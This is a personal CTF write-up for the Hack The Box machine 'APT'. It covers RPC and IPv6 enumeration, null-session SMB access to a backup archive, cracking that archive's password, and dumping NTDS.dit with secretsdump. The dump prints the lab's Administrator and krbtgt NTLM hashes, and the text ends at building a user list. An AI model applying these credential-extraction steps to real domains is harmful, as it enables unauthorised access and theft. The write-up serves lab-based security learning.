This was done following a guide. (not cheating but learning instead)
IP: 10.10.10.213
# Enumeration
## Nmap
```bash
sudo nmap -sC -sV 10.10.10.213

Starting Nmap 7.80 ( https://nmap.org ) at 2023-02-17 16:55 AEDT
Nmap scan report for 10.10.10.213
Host is up (0.0059s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Gigantic Hosting | Home
135/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Windows, IIS

## Port 80
html page

Email: `mail@gigantichosting.com`

Page cloned from:
```html
<!-- Mirrored from 10.13.38.16/support.html by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 23 Dec 2019 08:13:45 GMT -->
```

Contact form that goes no where

## msrpc
Metasploit scanners
```
scanner/dcerpc/endpoint_mapper
```

This gives a bunch of info.

### Impacket script
Uses this weird ip string; `ncacn_ip_tcp` which is an old interface for tcp.
```bash
rpcmap.py 'ncacn_ip_tcp:10.10.10.213' -brute-uuids -brute-opnums -auth-level 1 -opnum-max 5
```

For each opnum that comes back as success check what the UUID means

`99FCFEC4-5260-101B-BBCB-00AA0021347A`
* Opnum 3 : ServerAlive
* Opnum 5 : ServerAlive2 (retuns security bindings for UUIDs)

There is a python script which can enumerate this. [link](https://github.com/mubix/IOXIDResolver/blob/master/IOXIDResolver.py)

```bash
python3 oxid.py -t 10.10.10.213
[*] Retrieving network interface of 10.10.10.213
Address: apt
Address: 10.10.10.213
Address: dead:beef::85fe:8108:ccb3:a543
Address: dead:beef::184
Address: dead:beef::b885:d62a:d679:573f
```

Add the ipv6 addr to `/etc/hosts`.

## Nmap ipv6
This shows alot more info:
```bash
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
```

Most likely AD Domain controller.

Hostname from ldap
```
apt.htb.local
```

## SMB
Null authentication works for the backup directory which has a zip file. This is password protected.

Using zip2john then cracking with rockyou, gives a password of: `iloveyousomuch`

ntds.dit file.

# NTDS file
Running secretsdump.py on ntds.dit
```bash
python3 /opt/impacket/examples/secretsdump.py -pwd-last-set -user-status -history -ntds ntds.dit -security SECURITY -system SYSTEM local | tee secretsdump.bck
```

Check for password rotations
```bash
grep aad3b435b51404eeaad3b435b51404ee secretsdump.bck | grep history | grep -v history0

APT$_history1:1000:aad3b435b51404eeaad3b435b51404ee:4be5e714b1e235197d0d2de653ec9759:::
APT$_history2:1000:aad3b435b51404eeaad3b435b51404ee:04e8e55da6d3d5e6dd9d5b29272aa7f1:::
```

Check for passwords that have been changed.
```bash
grep aad3b435b51404eeaad3b435b51404ee secretsdump.bck | grep -v '03:3[567]' | grep -v history0

$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:e1934528fd9be4bb06e648526acc4a4d
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe::: (pwdLastSet=2020-09-22 21:53) (status=Enabled)
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (pwdLastSet=never) (status=Enabled)
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (pwdLastSet=never) (status=Disabled)
APT$:1000:aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb::: (pwdLastSet=2020-09-24 03:24) (status=Enabled)
APT$_history1:1000:aad3b435b51404eeaad3b435b51404ee:4be5e714b1e235197d0d2de653ec9759:::
APT$_history2:1000:aad3b435b51404eeaad3b435b51404ee:04e8e55da6d3d5e6dd9d5b29272aa7f1:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:72791983d95870c0d6dd999e4389b211::: (pwdLastSet=2020-09-20 23:14) (status=Disabled)
```

Make a user list.
```bash
grep aad3b435b51404eeaad3b435b51404ee secretsdump.bck |awk -F: '{print $1}' | grep -v history | sort -u > users.lst

```